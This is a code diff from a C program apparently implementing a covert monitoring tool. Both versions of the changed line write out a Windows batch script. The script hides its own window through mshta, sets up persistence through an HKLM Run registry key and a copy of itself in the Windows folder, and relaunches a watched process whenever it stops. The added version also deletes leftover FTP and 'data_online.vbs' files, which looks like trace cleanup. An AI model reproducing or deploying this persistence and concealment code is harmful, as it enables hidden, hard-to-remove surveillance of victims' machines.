@@ -1352,7 +1352,7 @@ void data__start_monitor(char *path)
 
 	itoa(time(&t),tm,10);
 
-	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel lstn.bat>nul",tmp,tmp,(int)time(&t),data__encode_uc(tm));
+	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel ftp1.txt>nul\ndel ftp2.txt>nul\ndel ftp3.txt>nul\ndel ftp4.txt>nul\ndel ftp5.txt>nul\ndel data_online.vbs>nul\ndel lstn.bat>nul",tmp,tmp,(int)time(&t),data__encode_uc(tm));
 
 
     /* close file */
